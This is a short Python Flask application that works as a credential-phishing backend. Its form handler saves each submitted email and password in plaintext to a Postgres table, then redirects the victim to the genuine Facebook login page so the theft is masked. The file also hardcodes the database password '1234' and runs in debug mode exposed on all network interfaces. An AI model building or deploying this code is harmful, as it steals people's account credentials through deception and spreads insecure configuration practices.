from flask import Flask, request, render_template, redirect
import psycopg2

app = Flask(__name__)

# Database configuration
DB_HOST = 'localhost'
DB_NAME = 'sars'
DB_USER = 'postgres'
DB_PASSWORD = '1234'

# DB connection
def get_db_connection():
    return psycopg2.connect(
        host=DB_HOST,
        dbname=DB_NAME,
        user=DB_USER,
        password=DB_PASSWORD
    )

# Home route (serves the HTML form)
@app.route('/')
def home():
    return render_template('index.html')  # Ensure this file exists in the 'templates' folder

# Form submission route
@app.route('/index', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    n = 'https://web.facebook.com/login.php/?_rdc=1&_rdr'

    # Save to database
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute(
        "INSERT INTO users (email, password) VALUES (%s, %s)",
        (email, password)
    )
    conn.commit()
    cur.close()
    conn.close()

    return redirect(n)

# Run server accessible on LAN
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
